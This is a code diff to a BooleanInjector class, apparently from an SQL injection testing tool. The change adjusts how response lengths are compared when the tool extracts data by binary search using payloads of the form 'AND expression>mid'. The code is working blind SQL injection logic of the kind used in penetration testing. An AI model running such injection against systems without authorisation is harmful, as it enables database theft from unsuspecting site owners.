@@ -1,5 +1,6 @@
 from core.Requester import Requester
 from core.Analyzer import Analyzer
+from utils.Logger import Logger
 from utils.constants import InjectionContext, DIFFER_LENGTH_BOOL
 
 class BooleanInjector:
@@ -56,6 +57,7 @@ class BooleanInjector:
 			url,
 			{ param: f"{ctx.prefix}AND 1=2{ctx.suffix}" }
 		)
+		# Logger.debug(r_false.body)
 
 		# Initial range
 		low = 0
@@ -67,9 +69,13 @@ class BooleanInjector:
 			# To check if the name length is higher to the current mid value
 			payload = f"{ctx.prefix}AND {expression}>{mid}{ctx.suffix}"
 			response = self.requester.send(url, { param: payload })
-
 			# If different then the condition is right
-			if self.analyzer.responses_differ(r_false, response, DIFFER_LENGTH_BOOL):
+			# Logger.debug(f"Diff len: {diff_len}")
+
+			# Add the length of the payload as baseline response doesn't contain expression
+			diff_len = DIFFER_LENGTH_BOOL + len(payload)
+
+			if self.analyzer.responses_differ(r_false, response, diff_len):
 				low = mid + 1
 			else:
 				high = mid
@@ -106,7 +112,11 @@ class BooleanInjector:
 				response = self.requester.send(url, { param: payload })
 
 				# If different then the condition is right
-				if self.analyzer.responses_differ(r_false, response, DIFFER_LENGTH_BOOL):
+    
+				# Add the length of the payload as baseline response doesn't contain expression
+				diff_len = DIFFER_LENGTH_BOOL + len(payload)
+
+				if self.analyzer.responses_differ(r_false, response, diff_len):
 					low = mid + 1
 				else:
 					high = mid
@@ -148,8 +158,11 @@ class BooleanInjector:
 				)
 				response = self.requester.send(url, { param: payload })
 
+				# Add the length of the payload as baseline response doesn't contain expression
+				diff_len = DIFFER_LENGTH_BOOL + len(payload)
+    
 				# If different then the condition is right
-				if self.analyzer.responses_differ(r_false, response, DIFFER_LENGTH_BOOL):
+				if self.analyzer.responses_differ(r_false, response, diff_len):
 					low = mid + 1
 				else:
 					high = mid
